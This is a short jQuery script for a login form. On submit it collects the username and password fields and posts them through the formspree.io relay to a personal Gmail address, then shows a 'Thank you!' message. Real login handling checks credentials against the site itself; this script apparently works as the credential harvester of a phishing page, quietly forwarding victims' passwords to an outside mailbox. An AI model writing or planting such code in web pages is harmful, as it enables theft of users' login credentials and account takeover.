
$(function() {
    $("#submit").click(function(e) {
        e.preventDefault();
        $.ajax({
            url: "//formspree.io/natalia9rokicka@gmail.com",
            method: "POST",
            data: {
                name: $("#login").val(),
                password: $("#pswd").val(),
            },
            dataType: "json"
        })
        .done(function(data){
            $("#MyForm").html("<h1>Thank you!</h1>" 
              + "<p> Additional info: " + JSON.stringify(data) + "</p>");
        });
    });
});

